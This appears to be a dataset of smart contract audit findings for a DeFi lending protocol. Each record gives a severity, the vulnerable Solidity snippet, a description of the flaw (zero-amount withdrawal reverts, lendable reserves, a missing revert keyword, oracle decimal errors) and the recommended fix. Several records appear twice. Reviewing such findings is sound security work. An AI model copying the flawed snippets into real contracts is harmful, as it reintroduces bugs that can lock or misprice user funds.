`_withdrawFromPlugin()` will revert when `_withdrawalValues[i] == 0`чmediumч```\n  function validateWithdraw(\n    address reserveAddress,\n    uint256 amount,\n    uint256 userBalance,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    DataTypes.UserConfigurationMap storage userConfig,\n    mapping(uint256 => address) storage reserves,\n    uint256 reservesCount,\n    address oracle\n  ) external view {\n    require(amount != 0, Errors.VL_INVALID_AMOUNT);\n```\nчWhen `_withdrawalValues[i] == 0` in `rebalancePlugins()`, it means NOT to rebalance this plugin.\nHowever, the current implementation still tries to withdraw 0 from the plugin.\nThis will revert in AaveV2Plugin as Aave V2's `validateWithdraw()` does not allow `0` withdrawals:\n```\n  function validateWithdraw(\n    address reserveAddress,\n    uint256 amount,\n    uint256 userBalance,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    DataTypes.UserConfigurationMap storage userConfig,\n    mapping(uint256 => address) storage reserves,\n    uint256 reservesCount,\n    address oracle\n  ) external view {\n    require(amount != 0, Errors.VL_INVALID_AMOUNT);\n```\n\n`removePlugin()` will also always `_withdrawFromPlugin()` even if the plugin's balance is 0, as it will also tries to withdraw 0 in that case (balance is 0).ч"Only call `_withdrawFromPlugin()` when IPlugin(pluginAddr).balance() > 0:\n```\nfunction removePlugin(uint256 _index) external onlyOwner {\n    require(_index < pluginCount, ""Index out of bounds"");\n    address pluginAddr = plugins[_index];\n    if (IPlugin(pluginAddr).balance() > 0){\n        _withdrawFromPlugin(pluginAddr, IPlugin(pluginAddr).balance());\n    }\n    uint256 pointer = _index;\n    while (pointer < pluginCount - 1) {\n        plugins[pointer] = plugins[pointer + 1];\n        pointer++;\n    }\n    delete plugins[pluginCount - 1];\n    pluginCount--;\n\n    IERC20(LINK).approve(pluginAddr, 0);\n\n    emit PluginRemoved(pluginAddr);\n}\n```\n\n```\nfunction rebalancePlugins(uint256[] memory _withdrawalValues) external onlyOwner {\n    require(_withdrawalValues.length == pluginCount, ""Invalid withdrawal values"");\n    for (uint256 i = 0; i < pluginCount; i++) {\n        if (_withdrawalValues[i] > 0)\n            _withdrawFromPlugin(plugins[i], _withdrawalValues[i]);\n    }\n    _distributeToPlugins();\n}\n```\n"чFor AaveV2Plugin (and any future plugins that dont allow withdraw 0):\nIn every rebalance call, it must at least withdraw 1 wei from the plugin for the rebalance to work.\nThe plugin can not be removed or rebalanced when there is no balance in it.\nIf such a plugin can not deposit for some reason (paused by gov, AaveV2Plugin may face that), this will further cause the whole system unable to be rebalanced until the deposit resumes for that plugin.\nCode Snippet\nTool used\nManual Review
Protocol Reserve Within A LToken Vault Can Be Lent Outчmediumч```\nfunction totalAssets() public view override returns (uint) {\n    return asset.balanceOf(address(this)) + getBorrows() - getReserves();\n}\n```\nчProtocol reserve, which serves as a liquidity backstop or to compensate the protocol, within a LToken vault can be lent out to the borrowers.\nThe purpose of the protocol reserve within a LToken vault is to compensate the protocol or serve as a liquidity backstop. However, based on the current setup, it is possible for the protocol reserve within a Ltoken vault to be lent out.\nThe following functions within the `LToken` contract show that the protocol reserve is intentionally preserved by removing the protocol reserve from the calculation of total assets within a `LToken` vault. As such, whenever the Liquidity Providers (LPs) attempt to redeem their LP token, the protocol reserves will stay intact and will not be withdrawn by the LPs.\n```\nfunction totalAssets() public view override returns (uint) {\n    return asset.balanceOf(address(this)) + getBorrows() - getReserves();\n}\n```\n\n```\nfunction getBorrows() public view returns (uint) {\n    return borrows + borrows.mulWadUp(getRateFactor());\n}\n```\n\n```\nfunction getReserves() public view returns (uint) {\n    return reserves + borrows.mulWadUp(getRateFactor())\n    .mulWadUp(reserveFactor);\n}\n```\n\nHowever, this measure is not applied consistently across the protocol. The following `lendTo` function shows that as long as the borrower has sufficient collateral to ensure their account remains healthy, the borrower could borrow as many assets from the LToken vault as they wish.\nIn the worst-case scenario, the borrower can borrow all the assets from the LToken vault, including the protocol reserve.ч"
`Reserves` should not be considered part of the available liquidity while calculating the interest rateчmediumч```\n    function getRateFactor() internal view returns (uint) {\n        return (block.timestamp == lastUpdated) ?\n            0 :\n            ((block.timestamp - lastUpdated)*1e18)\n            .mulWadUp(\n                rateModel.getBorrowRatePerSecond(\n                    asset.balanceOf(address(this)),\n                    borrows\n                )\n            );\n    }\n```\nчThe implementation is different from the documentation regarding the interest rate formula.\nThe formula given in the docs:\nCalculates Borrow rate per second:\n$$ Borrow Rate Per Second = c3 \cdot (util \cdot c1 + util^{32} \cdot c1 + util^{64} \cdot c2) \div secsPerYear $$\nwhere, $util = borrows \div (liquidity - reserves + borrows)$\n$$ util=borrows \div (liquidity−reserves+borrows) $$\n```\n    function getRateFactor() internal view returns (uint) {\n        return (block.timestamp == lastUpdated) ?\n            0 :\n            ((block.timestamp - lastUpdated)*1e18)\n            .mulWadUp(\n                rateModel.getBorrowRatePerSecond(\n                    asset.balanceOf(address(this)),\n                    borrows\n                )\n            );\n    }\n```\n\nHowever, the current implementation is taking all the balance as the liquidity:\n```\n    function getBorrowRatePerSecond(\n        uint liquidity,\n        uint borrows\n    )\n        external\n        view\n        returns (uint)\n    {\n        uint util = _utilization(liquidity, borrows);\n        return c3.mulDivDown(\n            (\n                util.mulWadDown(c1)\n                + util.rpow(32, SCALE).mulWadDown(c1)\n                + util.rpow(64, SCALE).mulWadDown(c2)\n            ),\n            secsPerYear\n        );\n    }\n```\n\n```\n    function _utilization(uint liquidity, uint borrows)\n        internal\n        pure\n        returns (uint)\n    {\n        uint totalAssets = liquidity + borrows;\n        return (totalAssets == 0) ? 0 : borrows.divWadDown(totalAssets);\n    }\n```\nч
LToken's implmentation is not fully up to EIP-4626's specificationчmediumч```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```\nчNote: This issue is a part of the extra scope added by Sentiment AFTER the audit contest. This scope was only reviewed by WatchPug and relates to these three PRs:\nLending deposit cap\nFee accrual modification\nCRV staking\nLToken's implmentation is not fully up to EIP-4626's specification. This issue is would actually be considered a Low issue if it were a part of a Sherlock contest.\n```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```\n\nMUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.\nhttps://eips.ethereum.org/EIPS/eip-4626#:~:text=MUST%20return%20the%20maximum%20amount%20of%20shares,NOT%20rely%20on%20balanceOf%20of%20asset\nmaxMint() and maxDeposit() should reflect the limitation of maxSupply.чmaxMint() and maxDeposit() should reflect the limitation of maxSupply.\nConsider changing maxMint() and maxDeposit() to:\n```\nfunction maxMint(address) public view virtual returns (uint256) {\n    if (totalSupply >= maxSupply) {\n        return 0;\n    }\n    return maxSupply - totalSupply;\n}\n```\n\n```\nfunction maxDeposit(address) public view virtual returns (uint256) {\n    return convertToAssets(maxMint(address(0)));\n}\n```\n\nSentiment Team\nFixed as recommended. PR here.\nLead Senior Watson\nConfirmed fix.чCould cause unexpected behavior in the future due to non-compliance with EIP-4626 standard.\nCode Snippet\n```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```\n\nTool used\nManual Review
`UniV2LPOracle` will malfunction if token0 or token1's `decimals != 18`чhighч```\nfunction getPrice(address pair) external view returns (uint) {\n    (uint r0, uint r1,) = IUniswapV2Pair(pair).getReserves();\n\n    // 2 * sqrt(r0 * r1 * p0 * p1) / totalSupply\n    return FixedPointMathLib.sqrt(\n        r0\n        .mulWadDown(r1)\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token0()))\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token1()))\n    )\n    .mulDivDown(2e27, IUniswapV2Pair(pair).totalSupply());\n}\n```\nчWhen one of the LP token's underlying tokens `decimals` is not 18, the price of the LP token calculated by `UniV2LPOracle` will be wrong.\n`UniV2LPOracle` is an implementation of Alpha Homora v2's Fair Uniswap's LP Token Pricing Formula:\nThe Formula ... of combining fair asset prices and fair asset reserves:\n$$ P = 2\cdot \frac{\sqrt{r_0 \cdot r_1} \cdot \sqrt{p_0\cdot p_1}}{totalSupply}, $$\nwhere $r_i$ is the asset ii's pool balance and $p_i$ is the asset $i$'s fair price.\nHowever, the current implementation wrongful assumes $r_0$ and $r_1$ are always in 18 decimals.\n```\nfunction getPrice(address pair) external view returns (uint) {\n    (uint r0, uint r1,) = IUniswapV2Pair(pair).getReserves();\n\n    // 2 * sqrt(r0 * r1 * p0 * p1) / totalSupply\n    return FixedPointMathLib.sqrt(\n        r0\n        .mulWadDown(r1)\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token0()))\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token1()))\n    )\n    .mulDivDown(2e27, IUniswapV2Pair(pair).totalSupply());\n}\n```\n\n```\nuint256 internal constant WAD = 1e18; // The scalar of ETH and most ERC20s.\n\nfunction mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {\n    return mulDivDown(x, y, WAD); // Equivalent to (x * y) / WAD rounded down.\n}\n```\n\n```\nfunction mulDivDown(\n    uint256 x,\n    uint256 y,\n    uint256 denominator\n) internal pure returns (uint256 z) {\n    assembly {\n        // Store x * y in z for now.\n        z := mul(x, y)\n\n        // Equivalent to require(denominator != 0 && (x == 0 || (x * y) / x == y))\n        if iszero(and(iszero(iszero(denominator)), or(iszero(x), eq(div(z, x), y)))) {\n            revert(0, 0)\n        }\n\n        // Divide z by the denominator.\n        z := div(z, denominator)\n    }\n}\n```\nч
Tokens received from Curve's `remove_liquidity()` should be added to the assets list even if `_min_amounts` are set to `0`чhighч```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    (,uint256[2] memory amounts) = abi.decode(\n        data[4:],\n        (uint256, uint256[2])\n    );\n\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    uint i; uint j;\n    address[] memory tokensIn = new address[](2);\n    while(i < 2) {\n        if(amounts[i] > 0)\n            tokensIn[j++] = IStableSwapPool(target).coins(i);\n        unchecked { ++i; }\n    }\n    assembly { mstore(tokensIn, j) }\n\n    return (true, tokensIn, tokensOut);\n}\n```\nч"Curve controller's `canRemoveLiquidity()` should return all the underlying tokens as `tokensIn` rather than only the tokens with `minAmount > 0`.\n```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    (,uint256[2] memory amounts) = abi.decode(\n        data[4:],\n        (uint256, uint256[2])\n    );\n\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    uint i; uint j;\n    address[] memory tokensIn = new address[](2);\n    while(i < 2) {\n        if(amounts[i] > 0)\n            tokensIn[j++] = IStableSwapPool(target).coins(i);\n        unchecked { ++i; }\n    }\n    assembly { mstore(tokensIn, j) }\n\n    return (true, tokensIn, tokensOut);\n}\n```\n\nThe `amounts` in Curve controller's `canRemoveLiquidity()` represent the ""Minimum `amounts` of underlying coins to receive"", which is used for slippage control.\nAt L144-149, only the tokens that specified a minAmount > 0 will be added to the `tokensIn` list, which will later be added to the account's assets list.\nWe believe this is wrong as regardless of the minAmount `remove_liquidity()` will always receive all the underlying tokens.\nTherefore, it should not check and only add the token when it's minAmount > 0."ч`canRemoveLiquidity()` can be changed to:\n```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    address[] memory tokensIn = new address[](2);\n    tokensIn[0] = IStableSwapPool(target).coins(0);\n    tokensIn[1] = IStableSwapPool(target).coins(1);\n    return (true, tokensIn, tokensOut);\n}\n```\n\nSentiment Team\nFixed as recommended. PR here.\nLead Senior Watson\nConfirmed fix.ч"Code Snippet\nhttps://arbiscan.io/address/0x7f90122bf0700f9e7e1f688fe926940e8839f353#code\n```\n@external\n@nonreentrant('lock')\ndef remove_liquidity(\n    _burn_amount: uint256,\n    _min_amounts: uint256[N_COINS],\n    _receiver: address = msg.sender\n) -> uint256[N_COINS]:\n    """"""\n    @notice Withdraw coins from the pool\n    @dev Withdrawal amounts are based on current deposit ratios\n    @param _burn_amount Quantity of LP tokens to burn in the withdrawal\n    @param _min_amounts Minimum amounts of underlying coins to receive\n    @param _receiver Address that receives the withdrawn coins\n    @return List of amounts of coins that were withdrawn\n    """"""\n    total_supply: uint256 = self.totalSupply\n    amounts: uint256[N_COINS] = empty(uint256[N_COINS])\n\n    for i in range(N_COINS):\n        old_balance: uint256 = self.balances[i]\n        value: uint256 = old_balance * _burn_amount / total_supply\n        assert value >= _min_amounts[i], ""Withdrawal resulted in fewer coins than expected""\n        self.balances[i] = old_balance - value\n        amounts[i] = value\n        ERC20(self.coins[i]).transfer(_receiver, value)\n\n    total_supply -= _burn_amount\n    self.balanceOf[msg.sender] -= _burn_amount\n    self.totalSupply = total_supply\n    log Transfer(msg.sender, ZERO_ADDRESS, _burn_amount)\n\n    log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply)\n\n    return amounts\n```\n\nTool used\nManual Review"
Accounts with ETH loans can not be liquidated if LEther's underlying is set to `address(0)`чmediumч```\nfunction borrow(address account, address token, uint amt)\n    external\n    whenNotPaused\n    onlyOwner(account)\n{\n    if (registry.LTokenFor(token) == address(0))\n        revert Errors.LTokenUnavailable();\n    if (!riskEngine.isBorrowAllowed(account, token, amt))\n        revert Errors.RiskThresholdBreached();\n    if (IAccount(account).hasAsset(token) == false)\n        IAccount(account).addAsset(token);\n    if (ILToken(registry.LTokenFor(token)).lendTo(account, amt))\n        IAccount(account).addBorrow(token);\n    emit Borrow(account, msg.sender, token, amt);\n}\n```\nчSetting `address(0)` as LEther's `underlying` is allowed, and the logic in `AccountManager#settle()` and `RiskEngine#_valueInWei()` handles `address(0)` specially, which implies that `address(0)` can be an asset.\nHowever, if LEther's underlying is set to `address(0)`, the accounts with ETH loans will become unable to be liquidated.\nWe assume that `address(0)` can be set as the `underlying` of `LEther`.\nIn that case, when the user borrows native tokens, `address(0)` will be added to the user's assets and borrows list.\n```\nfunction borrow(address account, address token, uint amt)\n    external\n    whenNotPaused\n    onlyOwner(account)\n{\n    if (registry.LTokenFor(token) == address(0))\n        revert Errors.LTokenUnavailable();\n    if (!riskEngine.isBorrowAllowed(account, token, amt))\n        revert Errors.RiskThresholdBreached();\n    if (IAccount(account).hasAsset(token) == false)\n        IAccount(account).addAsset(token);\n    if (ILToken(registry.LTokenFor(token)).lendTo(account, amt))\n        IAccount(account).addBorrow(token);\n    emit Borrow(account, msg.sender, token, amt);\n}\n```\n\nThis will later prevent the user from being liquidated because in `riskEngine.isAccountHealthy()`, it calls `_getBalance()` in the for loop of all the assets, which assumes all the assets complies with `IERC20`. Thus, the transaction will revert at L157 when calling `IERC20(address(0)).balanceOf(account)`.\n```\nfunction liquidate(address account) external {\n    if (riskEngine.isAccountHealthy(account))\n        revert Errors.AccountNotLiquidatable();\n    _liquidate(account);\n    emit AccountLiquidated(account, registry.ownerFor(account));\n}\n```\n\n```\nfunction _getBalance(address account) internal view returns (uint) {\n    address[] memory assets = IAccount(account).getAssets();\n    uint assetsLen = assets.length;\n    uint totalBalance;\n    for(uint i; i < assetsLen; ++i) {\n        totalBalance += _valueInWei(\n            assets[i],\n            IERC20(assets[i]).balanceOf(account)\n        );\n    }\n    return totalBalance + account.balance;\n}\n```\nч
Missing revert keywordчmediumч```\nif (!isContract(target)) Errors.AddressNotContract;\n```\nч"Missing `revert` keyword in `functionDelegateCall` bypasses an intended safety check, allowing the function to fail silently.\nIn the helper function `functionDelegateCall`, there is a check to confirm that the target being called is a contract.\n```\nif (!isContract(target)) Errors.AddressNotContract;\n```\n\nHowever, there is a typo in the check that is missing the `revert` keyword.\nAs a result, non-contracts can be submitted as targets, which will cause the delegatecall below to return success (because EVM treats no code as STOP opcode), even though it doesn't do anything.\n```\n(bool success, ) = target.delegatecall(data);\nrequire(success, ""CALL_FAILED"");\n```\n"ч
`Reserves` should not be considered part of the available liquidity while calculating the interest rateчmediumч```\n    function getRateFactor() internal view returns (uint) {\n        return (block.timestamp == lastUpdated) ?\n            0 :\n            ((block.timestamp - lastUpdated)*1e18)\n            .mulWadUp(\n                rateModel.getBorrowRatePerSecond(\n                    asset.balanceOf(address(this)),\n                    borrows\n                )\n            );\n    }\n```\nчThe implementation is different from the documentation regarding the interest rate formula.\nThe formula given in the docs:\nCalculates Borrow rate per second:\n$$ Borrow Rate Per Second = c3 \cdot (util \cdot c1 + util^{32} \cdot c1 + util^{64} \cdot c2) \div secsPerYear $$\nwhere, $util = borrows \div (liquidity - reserves + borrows)$\n$$ util=borrows \div (liquidity−reserves+borrows) $$\n```\n    function getRateFactor() internal view returns (uint) {\n        return (block.timestamp == lastUpdated) ?\n            0 :\n            ((block.timestamp - lastUpdated)*1e18)\n            .mulWadUp(\n                rateModel.getBorrowRatePerSecond(\n                    asset.balanceOf(address(this)),\n                    borrows\n                )\n            );\n    }\n```\n\nHowever, the current implementation is taking all the balance as the liquidity:\n```\n    function getBorrowRatePerSecond(\n        uint liquidity,\n        uint borrows\n    )\n        external\n        view\n        returns (uint)\n    {\n        uint util = _utilization(liquidity, borrows);\n        return c3.mulDivDown(\n            (\n                util.mulWadDown(c1)\n                + util.rpow(32, SCALE).mulWadDown(c1)\n                + util.rpow(64, SCALE).mulWadDown(c2)\n            ),\n            secsPerYear\n        );\n    }\n```\n\n```\n    function _utilization(uint liquidity, uint borrows)\n        internal\n        pure\n        returns (uint)\n    {\n        uint totalAssets = liquidity + borrows;\n        return (totalAssets == 0) ? 0 : borrows.divWadDown(totalAssets);\n    }\n```\nчThe implementation of `getRateFactor()` can be updated to:\n```\nfunction getRateFactor() internal view returns (uint) {\n    return (block.timestamp == lastUpdated) ?\n        0 :\n        ((block.timestamp - lastUpdated)*1e18)\n        .mulWadUp(\n            rateModel.getBorrowRatePerSecond(\n                asset.balanceOf(address(this)) - reserves,\n                borrows\n            )\n        );\n}\n```\n\nSentiment Team\nRemoved reserves from LToken and added an alternate mechanism to collect direct fees.\nLead Senior Watson\noriginationFee may result in the borrower account becoming liquidatable immediately (aka WP-M2).\nSentiment Team\nFixed as recommended. PR here.\nLead Senior Watson\nriskEngine.isBorrowAllowed should be removed as it's no longer needed.\nSentiment Team\nPushed a commit to remove the redundant call to riskEngine. PR here.чPer the docs, when calculating the interest rate, `util` is the ratio of available liquidity to the `borrows`, available liquidity should not include reserves.\nThe current implementation is using all the balance as the `liquidity`, this will make the interest rate lower than expectation.\nPoC\nGiven:\n`asset.address(this) + borrows = 10000`\n`reserves = 1500, borrows = 7000`\nExpected result:\nWhen calculating `getRateFactor()`, available liquidity should be `asset.balanceOf(address(this)) - reserves = 1500, util = 7000 / 8500 = 0.82`, `getBorrowRatePerSecond() = 9114134329`\nActual result:\nWhen calculating `getRateFactor()`, `asset.balanceOf(address(this)) = 3000, util = 0.7e18`, `getBorrowRatePerSecond() = 7763863430`\nThe actual interest rate is only `7763863430 / 9114134329 = 85%` of the expected rate.\nCode Snippet\nTool used\nManual Review
LToken's implmentation is not fully up to EIP-4626's specificationчmediumч```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```\nчNote: This issue is a part of the extra scope added by Sentiment AFTER the audit contest. This scope was only reviewed by WatchPug and relates to these three PRs:\nLending deposit cap\nFee accrual modification\nCRV staking\nLToken's implmentation is not fully up to EIP-4626's specification. This issue is would actually be considered a Low issue if it were a part of a Sherlock contest.\n```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```\n\nMUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.\nhttps://eips.ethereum.org/EIPS/eip-4626#:~:text=MUST%20return%20the%20maximum%20amount%20of%20shares,NOT%20rely%20on%20balanceOf%20of%20asset\nmaxMint() and maxDeposit() should reflect the limitation of maxSupply.чmaxMint() and maxDeposit() should reflect the limitation of maxSupply.\nConsider changing maxMint() and maxDeposit() to:\n```\nfunction maxMint(address) public view virtual returns (uint256) {\n    if (totalSupply >= maxSupply) {\n        return 0;\n    }\n    return maxSupply - totalSupply;\n}\n```\n\n```\nfunction maxDeposit(address) public view virtual returns (uint256) {\n    return convertToAssets(maxMint(address(0)));\n}\n```\n\nSentiment Team\nFixed as recommended. PR here.\nLead Senior Watson\nConfirmed fix.чCould cause unexpected behavior in the future due to non-compliance with EIP-4626 standard.\nCode Snippet\n```\nfunction maxMint(address) public view virtual returns (uint256) {\n    return type(uint256).max;\n}\n```\n\nTool used\nManual Review
`UniV2LPOracle` will malfunction if token0 or token1's `decimals != 18`чhighч```\nfunction getPrice(address pair) external view returns (uint) {\n    (uint r0, uint r1,) = IUniswapV2Pair(pair).getReserves();\n\n    // 2 * sqrt(r0 * r1 * p0 * p1) / totalSupply\n    return FixedPointMathLib.sqrt(\n        r0\n        .mulWadDown(r1)\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token0()))\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token1()))\n    )\n    .mulDivDown(2e27, IUniswapV2Pair(pair).totalSupply());\n}\n```\nчWhen one of the LP token's underlying tokens `decimals` is not 18, the price of the LP token calculated by `UniV2LPOracle` will be wrong.\n`UniV2LPOracle` is an implementation of Alpha Homora v2's Fair Uniswap's LP Token Pricing Formula:\nThe Formula ... of combining fair asset prices and fair asset reserves:\n$$ P = 2\cdot \frac{\sqrt{r_0 \cdot r_1} \cdot \sqrt{p_0\cdot p_1}}{totalSupply}, $$\nwhere $r_i$ is the asset ii's pool balance and $p_i$ is the asset $i$'s fair price.\nHowever, the current implementation wrongful assumes $r_0$ and $r_1$ are always in 18 decimals.\n```\nfunction getPrice(address pair) external view returns (uint) {\n    (uint r0, uint r1,) = IUniswapV2Pair(pair).getReserves();\n\n    // 2 * sqrt(r0 * r1 * p0 * p1) / totalSupply\n    return FixedPointMathLib.sqrt(\n        r0\n        .mulWadDown(r1)\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token0()))\n        .mulWadDown(oracle.getPrice(IUniswapV2Pair(pair).token1()))\n    )\n    .mulDivDown(2e27, IUniswapV2Pair(pair).totalSupply());\n}\n```\n\n```\nuint256 internal constant WAD = 1e18; // The scalar of ETH and most ERC20s.\n\nfunction mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {\n    return mulDivDown(x, y, WAD); // Equivalent to (x * y) / WAD rounded down.\n}\n```\n\n```\nfunction mulDivDown(\n    uint256 x,\n    uint256 y,\n    uint256 denominator\n) internal pure returns (uint256 z) {\n    assembly {\n        // Store x * y in z for now.\n        z := mul(x, y)\n\n        // Equivalent to require(denominator != 0 && (x == 0 || (x * y) / x == y))\n        if iszero(and(iszero(iszero(denominator)), or(iszero(x), eq(div(z, x), y)))) {\n            revert(0, 0)\n        }\n\n        // Divide z by the denominator.\n        z := div(z, denominator)\n    }\n}\n```\nч
Tokens received from Curve's `remove_liquidity()` should be added to the assets list even if `_min_amounts` are set to `0`чhighч```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    (,uint256[2] memory amounts) = abi.decode(\n        data[4:],\n        (uint256, uint256[2])\n    );\n\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    uint i; uint j;\n    address[] memory tokensIn = new address[](2);\n    while(i < 2) {\n        if(amounts[i] > 0)\n            tokensIn[j++] = IStableSwapPool(target).coins(i);\n        unchecked { ++i; }\n    }\n    assembly { mstore(tokensIn, j) }\n\n    return (true, tokensIn, tokensOut);\n}\n```\nч"Curve controller's `canRemoveLiquidity()` should return all the underlying tokens as `tokensIn` rather than only the tokens with `minAmount > 0`.\n```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    (,uint256[2] memory amounts) = abi.decode(\n        data[4:],\n        (uint256, uint256[2])\n    );\n\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    uint i; uint j;\n    address[] memory tokensIn = new address[](2);\n    while(i < 2) {\n        if(amounts[i] > 0)\n            tokensIn[j++] = IStableSwapPool(target).coins(i);\n        unchecked { ++i; }\n    }\n    assembly { mstore(tokensIn, j) }\n\n    return (true, tokensIn, tokensOut);\n}\n```\n\nThe `amounts` in Curve controller's `canRemoveLiquidity()` represent the ""Minimum `amounts` of underlying coins to receive"", which is used for slippage control.\nAt L144-149, only the tokens that specified a minAmount > 0 will be added to the `tokensIn` list, which will later be added to the account's assets list.\nWe believe this is wrong as regardless of the minAmount `remove_liquidity()` will always receive all the underlying tokens.\nTherefore, it should not check and only add the token when it's minAmount > 0."ч`canRemoveLiquidity()` can be changed to:\n```\nfunction canRemoveLiquidity(address target, bytes calldata data)\n    internal\n    view\n    returns (bool, address[] memory, address[] memory)\n{\n    address[] memory tokensOut = new address[](1);\n    tokensOut[0] = target;\n\n    address[] memory tokensIn = new address[](2);\n    tokensIn[0] = IStableSwapPool(target).coins(0);\n    tokensIn[1] = IStableSwapPool(target).coins(1);\n    return (true, tokensIn, tokensOut);\n}\n```\n\nSentiment Team\nFixed as recommended. PR here.\nLead Senior Watson\nConfirmed fix.ч"Code Snippet\nhttps://arbiscan.io/address/0x7f90122bf0700f9e7e1f688fe926940e8839f353#code\n```\n@external\n@nonreentrant('lock')\ndef remove_liquidity(\n    _burn_amount: uint256,\n    _min_amounts: uint256[N_COINS],\n    _receiver: address = msg.sender\n) -> uint256[N_COINS]:\n    """"""\n    @notice Withdraw coins from the pool\n    @dev Withdrawal amounts are based on current deposit ratios\n    @param _burn_amount Quantity of LP tokens to burn in the withdrawal\n    @param _min_amounts Minimum amounts of underlying coins to receive\n    @param _receiver Address that receives the withdrawn coins\n    @return List of amounts of coins that were withdrawn\n    """"""\n    total_supply: uint256 = self.totalSupply\n    amounts: uint256[N_COINS] = empty(uint256[N_COINS])\n\n    for i in range(N_COINS):\n        old_balance: uint256 = self.balances[i]\n        value: uint256 = old_balance * _burn_amount / total_supply\n        assert value >= _min_amounts[i], ""Withdrawal resulted in fewer coins than expected""\n        self.balances[i] = old_balance - value\n        amounts[i] = value\n        ERC20(self.coins[i]).transfer(_receiver, value)\n\n    total_supply -= _burn_amount\n    self.balanceOf[msg.sender] -= _burn_amount\n    self.totalSupply = total_supply\n    log Transfer(msg.sender, ZERO_ADDRESS, _burn_amount)\n\n    log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply)\n\n    return amounts\n```\n\nTool used\nManual Review"
Accounts with ETH loans can not be liquidated if LEther's underlying is set to `address(0)`чmediumч```\nfunction borrow(address account, address token, uint amt)\n    external\n    whenNotPaused\n    onlyOwner(account)\n{\n    if (registry.LTokenFor(token) == address(0))\n        revert Errors.LTokenUnavailable();\n    if (!riskEngine.isBorrowAllowed(account, token, amt))\n        revert Errors.RiskThresholdBreached();\n    if (IAccount(account).hasAsset(token) == false)\n        IAccount(account).addAsset(token);\n    if (ILToken(registry.LTokenFor(token)).lendTo(account, amt))\n        IAccount(account).addBorrow(token);\n    emit Borrow(account, msg.sender, token, amt);\n}\n```\nчSetting `address(0)` as LEther's `underlying` is allowed, and the logic in `AccountManager#settle()` and `RiskEngine#_valueInWei()` handles `address(0)` specially, which implies that `address(0)` can be an asset.\nHowever, if LEther's underlying is set to `address(0)`, the accounts with ETH loans will become unable to be liquidated.\nWe assume that `address(0)` can be set as the `underlying` of `LEther`.\nIn that case, when the user borrows native tokens, `address(0)` will be added to the user's assets and borrows list.\n```\nfunction borrow(address account, address token, uint amt)\n    external\n    whenNotPaused\n    onlyOwner(account)\n{\n    if (registry.LTokenFor(token) == address(0))\n        revert Errors.LTokenUnavailable();\n    if (!riskEngine.isBorrowAllowed(account, token, amt))\n        revert Errors.RiskThresholdBreached();\n    if (IAccount(account).hasAsset(token) == false)\n        IAccount(account).addAsset(token);\n    if (ILToken(registry.LTokenFor(token)).lendTo(account, amt))\n        IAccount(account).addBorrow(token);\n    emit Borrow(account, msg.sender, token, amt);\n}\n```\n\nThis will later prevent the user from being liquidated because in `riskEngine.isAccountHealthy()`, it calls `_getBalance()` in the for loop of all the assets, which assumes all the assets complies with `IERC20`. Thus, the transaction will revert at L157 when calling `IERC20(address(0)).balanceOf(account)`.\n```\nfunction liquidate(address account) external {\n    if (riskEngine.isAccountHealthy(account))\n        revert Errors.AccountNotLiquidatable();\n    _liquidate(account);\n    emit AccountLiquidated(account, registry.ownerFor(account));\n}\n```\n\n```\nfunction _getBalance(address account) internal view returns (uint) {\n    address[] memory assets = IAccount(account).getAssets();\n    uint assetsLen = assets.length;\n    uint totalBalance;\n    for(uint i; i < assetsLen; ++i) {\n        totalBalance += _valueInWei(\n            assets[i],\n            IERC20(assets[i]).balanceOf(account)\n        );\n    }\n    return totalBalance + account.balance;\n}\n```\nч
Missing revert keywordчmediumч```\nif (!isContract(target)) Errors.AddressNotContract;\n```\nч"Missing `revert` keyword in `functionDelegateCall` bypasses an intended safety check, allowing the function to fail silently.\nIn the helper function `functionDelegateCall`, there is a check to confirm that the target being called is a contract.\n```\nif (!isContract(target)) Errors.AddressNotContract;\n```\n\nHowever, there is a typo in the check that is missing the `revert` keyword.\nAs a result, non-contracts can be submitted as targets, which will cause the delegatecall below to return success (because EVM treats no code as STOP opcode), even though it doesn't do anything.\n```\n(bool success, ) = target.delegatecall(data);\nrequire(success, ""CALL_FAILED"");\n```\n"ч
